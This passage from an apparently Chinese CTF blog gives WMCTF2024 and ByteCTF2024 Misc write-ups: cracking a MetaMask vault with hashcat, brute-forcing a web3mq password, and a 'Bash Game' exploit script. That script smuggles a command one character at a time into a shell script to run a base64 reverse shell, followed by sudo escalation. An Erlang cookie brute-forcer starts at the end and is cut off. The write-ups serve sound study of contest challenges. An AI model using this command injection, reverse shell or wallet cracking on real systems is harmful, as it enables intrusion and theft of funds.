io.BufferedIOBase</span><br><span class="line"></span><br><span class="line">_buf: <span class="built_in">bytearray</span></span><br><span class="line">_buf_len: <span class="built_in">int</span></span><br><span class="line">_buf_pos: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, inner: io.BufferedIOBase</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">assert</span> inner.readable()</span><br><span class="line">self.inner = inner</span><br><span class="line">self._buf = <span class="built_in">bytearray</span>(<span class="number">65536</span>)</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readable</span>(<span class="params">self</span>) -&gt; ty.<span class="type">Literal</span>[<span class="literal">True</span>]:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_read_next_data_chunk</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="comment"># We start with the buffer empty</span></span><br><span class="line"><span class="keyword">assert</span> self._buf_len == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keep parsing chunks until something is added to the buffer</span></span><br><span class="line"><span class="keyword">while</span> self._buf_len == <span class="number">0</span>:</span><br><span class="line"><span class="comment"># Read chunk header</span></span><br><span class="line">header = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(header) == <span class="number">0</span>:</span><br><span class="line"><span class="comment"># EOF – buffer remains empty</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(header) != <span class="number">4</span>:</span><br><span class="line"><span class="comment"># Just part of a header being present is invalid</span></span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading Snappy chunk header&quot;</span>)</span><br><span class="line"><span class="built_in">type</span>, length = header[<span class="number">0</span>], <span class="built_in">int</span>.from_bytes(header[<span class="number">1</span>:<span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">0xFF</span>:</span><br><span class="line"><span class="comment"># Stream identifier – contents should be checked but otherwise ignored</span></span><br><span class="line"><span class="keyword">if</span> length != <span class="number">6</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid stream identifier (wrong length)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read and verify required content is present</span></span><br><span class="line">content = self.inner.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(content) != <span class="number">6</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading stream identifier&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content != <span class="string">b&quot;sNaPpY&quot;</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid stream identifier (wrong content)&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">0x00</span>:</span><br><span class="line"><span class="comment"># Compressed data</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read checksum</span></span><br><span class="line">checksum: <span class="built_in">bytes</span> = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(checksum) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data checksum&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read compressed data into new buffer</span></span><br><span class="line">compressed: <span class="built_in">bytes</span> = self.inner.read(length - <span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(compressed) != length - <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data contents&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decompress data into inner buffer</span></span><br><span class="line"><span class="comment">#<span class="doctag">XXX:</span> There does not appear to an efficient way to set the length</span></span><br><span class="line"><span class="comment">#     of a bytearray</span></span><br><span class="line">self._buf_len = cramjam.snappy.decompress_raw_into(compressed, self._buf)</span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Verify checksum</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">0x01</span>:</span><br><span class="line"><span class="comment"># Uncompressed data</span></span><br><span class="line"><span class="keyword">if</span> length &gt; <span class="number">65536</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid uncompressed data chunk (length &gt; 65536)&quot;</span>)</span><br><span class="line"></span><br><span class="line">checksum: <span class="built_in">bytes</span> = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(checksum) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data checksum&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read chunk data into buffer</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">memoryview</span>(self._buf) <span class="keyword">as</span> view:</span><br><span class="line"><span class="keyword">if</span> self.inner.readinto(view[:(length - <span class="number">4</span>)]) != length - <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data contents&quot;</span>)</span><br><span class="line">self._buf_len = length - <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Verify checksum</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x80</span>, <span class="number">0xFE</span> + <span class="number">1</span>):</span><br><span class="line"><span class="comment"># Padding and reserved skippable chunks – just skip the contents</span></span><br><span class="line"><span class="keyword">if</span> self.inner.seekable():</span><br><span class="line">self.inner.seek(length, io.SEEK_CUR)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.inner.read(length)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unexpected unskippable reserved chunk: 0x<span class="subst">&#123;<span class="built_in">type</span>:02X&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read1</span>(<span class="params">self, size: ty.<span class="type">Optional</span>[<span class="built_in">int</span>] = -<span class="number">1</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="comment"># Read another chunk if the buffer is currently empty</span></span><br><span class="line"><span class="keyword">if</span> self._buf_len &lt; <span class="number">1</span>:</span><br><span class="line">self._read_next_data_chunk()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Return some of the data currently present in the buffer</span></span><br><span class="line">start = self._buf_pos</span><br><span class="line"><span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> size &lt; <span class="number">0</span>:</span><br><span class="line">end = self._buf_len</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">end = <span class="built_in">min</span>(start + size, self._buf_len)</span><br><span class="line"></span><br><span class="line">result: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>(self._buf[start:end])</span><br><span class="line"><span class="keyword">if</span> end &lt; self._buf_len:</span><br><span class="line">self._buf_pos = end</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: ty.<span class="type">Optional</span>[<span class="built_in">int</span>] = -<span class="number">1</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">buf: <span class="built_in">bytearray</span> = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> size &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(data := self.read1()) &gt; <span class="number">0</span>:</span><br><span class="line">buf += data</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buf) &lt; size <span class="keyword">and</span> <span class="built_in">len</span>(data := self.read1(size - <span class="built_in">len</span>(buf))) &gt; <span class="number">0</span>:</span><br><span class="line">buf += data</span><br><span class="line"><span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readinto1</span>(<span class="params">self, buf: cabc.<span class="type">Sequence</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="comment"># Read another chunk if the buffer is currently empty</span></span><br><span class="line"><span class="keyword">if</span> self._buf_len &lt; <span class="number">1</span>:</span><br><span class="line">self._read_next_data_chunk()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy some of the data currently present in the buffer</span></span><br><span class="line">start = self._buf_pos</span><br><span class="line">end = <span class="built_in">min</span>(start + <span class="built_in">len</span>(buf), self._buf_len)</span><br><span class="line"></span><br><span class="line">buf[<span class="number">0</span>:(end - start)] = self._buf[start:end]</span><br><span class="line"><span class="keyword">if</span> end &lt; self._buf_len:</span><br><span class="line">self._buf_pos = end</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> end - start</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readinto</span>(<span class="params">self, buf: cabc.<span class="type">Sequence</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">memoryview</span>(buf) <span class="keyword">as</span> view:</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(buf) <span class="keyword">and</span> (length := self.readinto1(view[pos:])) &gt; <span class="number">0</span>:</span><br><span class="line">pos += length</span><br><span class="line"><span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;492&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> ff:</span><br><span class="line">d = Decompressor(ff)</span><br><span class="line">decoded = d.read()</span><br><span class="line">decodedStr = decoded.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(decodedStr)</span><br></pre></td></tr></table></figure><p>实际上也可以直接在010里找到我们需要的有关数据</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924160616244.png" alt="image-20240924160616244"></p><p>前面加上{“data”，提取出这一段</p><p>利用hashcat自带的工具metamask2hashcat.py将其转换为hash的形式，kali上这个脚本在&#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;tools&#x2F;的路径下</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924161701427.png" alt="image-20240924161701427"></p><p>由于metamask更新了加密策略，所以要引入额外的<a href="https://github.com/flyinginsect271/MetamaskHashcatModule">模块</a>再用hashcat爆破，字典就是之前得到的password.txt，下载下来的模块放在&#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;modules路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 26650 2.txt passwords.txt --force</span><br></pre></td></tr></table></figure><p>得到密码silversi</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924172838415.png" alt="image-20240924172838415"></p><p>然后用metamask官方的<a href="https://metamask.github.io/vault-decryptor/">解密网站</a>得到助记词</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924181017291.png" alt="image-20240924181017291"></p><p>接下来就可以通过助记词进入钱包账户</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924181436001.png" alt="image-20240924181436001"></p><p>翻找之前解压idb文件得到的内容，找到这样的一条进行hex解码</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924201614599.png" alt="image-20240924201614599"></p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924202447303.png" alt="image-20240924202447303"></p><p>这里记录的是一个web3mq的会话，其中的nonce遵循如下格式</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha3_224(`$web3mq$&#123;did_type&#125;:$&#123;did_value&#125;$&#123;keyIndex&#125;$&#123;password&#125;web3mq$`)</span><br></pre></td></tr></table></figure><p>通过类似上述操作，我们可以在其他地方找到如下信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">did_type: eth</span><br><span class="line">did_value: 0xd1abc6113bda0269129c0faa2bd0c9c1bb512be6（即钱包地址，这里全小写）</span><br><span class="line">keyIndex: 1</span><br></pre></td></tr></table></figure><p>于是可以写脚本，用之前的passwords.txt作字典爆破得到password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha3_224</span>(<span class="params">string</span>):</span><br><span class="line">        sha3 = hashlib.sha3_224()</span><br><span class="line">        string = <span class="string">&quot;$web3mqeth:0xd1abc6113bda0269129c0faa2bd0c9c1bb512be61&quot;</span>+string+<span class="string">&quot;web3mq$&quot;</span></span><br><span class="line">        sha3.update(string.encode())</span><br><span class="line">        <span class="keyword">return</span> sha3.hexdigest()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bruteforce_sha3_224</span>(<span class="params">target_hash, wordlist</span>):</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> wordlist:</span><br><span class="line">            computed_hash = sha3_224(word)</span><br><span class="line">            <span class="keyword">if</span> computed_hash == target_hash:</span><br><span class="line">                <span class="keyword">return</span> word</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    target_Nonce = <span class="string">&quot;Mzk2ZDBiNTVmZjkyMGRkYTVkNTFjMTQ3ODU4YTM1NDc4ZGE1NjExMTllYmRiYWE4MzQyM2M3YzI=&quot;</span></span><br><span class="line">    target_hash = base64.b64decode(target_Nonce).decode()</span><br><span class="line">    wordlist = <span class="built_in">open</span>(<span class="string">&quot;passwords.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;target_hash: &quot;</span>, target_hash)</span><br><span class="line">    original_string = bruteforce_sha3_224(target_hash, wordlist)</span><br><span class="line">    <span class="keyword">if</span> original_string:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found original string: <span class="subst">&#123;original_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No match found in the wordlist.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924203158501.png" alt="image-20240924203158501"></p><p>接下来登录web3mq即可</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924212246005.png" alt="image-20240924212246005"></p><p>由于rpc很不稳定，试了N次以后终于是进去了。。。pull一下最近的聊天记录即可看到flag</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924215222361.png" alt="image-20240924215222361"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> WMCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF2024初赛 部分Misc 复现</title>
      <link href="/2024/09/22/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/09/22/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>又是一次爆零的比赛。。。还是太菜了，还得多练。</p></blockquote><h3 id="Bash-Game"><a href="#Bash-Game" class="headerlink" title="Bash Game"></a>Bash Game</h3><blockquote><p>比赛的时候本以为这是唯一一道可能做出来的题，赛后看了wp才知道，即使最开始那个字符限制给我侥幸绕过了，后面也是狠狠坐牢。。。</p></blockquote><p>题目主要文件</p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;ByteCTF/lib/cmd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/update&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">result := Update(c)</span><br><span class="line">c.String(<span class="number">200</span>, result)</span><br><span class="line">&#125;)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Welcome to BashGame&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:23333&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> OpsPath = <span class="string">&quot;/opt/challenge/ops.sh&quot;</span></span><br><span class="line"><span class="keyword">const</span> CtfPath = <span class="string">&quot;/opt/challenge/ctf.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">(c *gin.Context)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">username := c.PostForm(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">6</span> &#123;</span><br><span class="line">_, err := cmd.Exec(<span class="string">&quot;/bin/bash&quot;</span>, OpsPath, username)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err.Error()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ret, err := cmd.Exec(<span class="string">&quot;/bin/bash&quot;</span>, CtfPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err.Error()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ops.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># -----------params------------</span></span><br><span class="line">name=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">switch_domain</span></span>() &#123;</span><br><span class="line">    conf_file=<span class="string">&quot;/opt/challenge/ctf.sh&quot;</span></span><br><span class="line">    sed -i <span class="string">&quot;s/Bytectf.*!/Bytectf, <span class="variable">$name</span>!/&quot;</span> <span class="string">&quot;<span class="variable">$conf_file</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">switch_domain</span><br></pre></td></tr></table></figure><p>ctf.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> welcome to Bytectf, username!</span><br></pre></td></tr></table></figure><p>题目的逻辑是向&#x2F;update post传参一个name，这个name的值会替换掉ctf.sh中的username，并且ctf.sh会被执行。</p><p>很显然就是要用这个name传入我们要执行的命令，但是题目中对输入的内容长度进行了检测，必须小于6。然而，用来表示内容是命令的反引号已经占掉了两个字符，也就是说得在三字符内构造出我们需要的命令。</p><p>写脚本，每次传一个字符，同时用#注释掉!，最终构成我们的反弹shell的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">rs = requests.Session()</span><br><span class="line">url_base = <span class="string">&#x27;http://xxx.clsadp.com&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_char</span>(<span class="params">char</span>):</span><br><span class="line">    url = url_base + <span class="string">&quot;/update&quot;</span></span><br><span class="line">    param = <span class="string">&#x27;\\0&#x27;</span>+char+<span class="string">&#x27;/#&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(param)&lt;<span class="number">6</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: param&#125;</span><br><span class="line">    response = rs.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    command = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    `echo &quot;（这里写自己的反弹shell命令的base64编码）&quot;|base64 -d|bash`</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.strip()</span><br><span class="line">    command = command[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> command:</span><br><span class="line">    add_char(char)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923002401672.png" alt="image-20240923002401672"></p><p>这里我们是ctf用户，也没法使用sudo，使用sudo -l看看能干什么</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923002541504.png" alt="image-20240923002541504"></p><p>这里是程序进行了检测是否是终端而我们是shell导致的没法使用sudo，获取ptyify将我们转化为伪终端会话。</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923003112221.png" alt="image-20240923003112221"></p><p>在数组的索引中插入命令，利用truegame.sh读取flag</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923003343716.png" alt="image-20240923003343716"></p><h3 id="Guess-Cookie"><a href="#Guess-Cookie" class="headerlink" title="Guess Cookie"></a>Guess Cookie</h3><p>题目要求提交重要通信的cookie的md5值</p><p>流量包中有很多用来混淆的cookie，但是显然这里要找的是erlang cookie</p><p>过滤erldp协议，可以看到很多send challenge的操作</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923235751542.png" alt="image-20240923235751542"></p><p>在github上可以找到有用来爆破erlang cookie的<a href="https://github.com/gteissier/erl-matter">脚本</a></p><p>由于这里不需要远程交互，可以直接从流量包中提取到challenge和digest，因此需要对bruteforce-erldp稍作一下修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> erldp <span class="keyword">import</span> authenticate</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> islice</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate</span>(<span class="params">cookie_bytes, challenge</span>):</span><br><span class="line">  md5_hash = hashlib.md5()</span><br><span class="line">  md5_hash.update(cookie_bytes)</span><br><span class="line">  md5_hash.update(<span class="built_in">str</span>(challenge).encode())</span><br><span class="line">  digest = 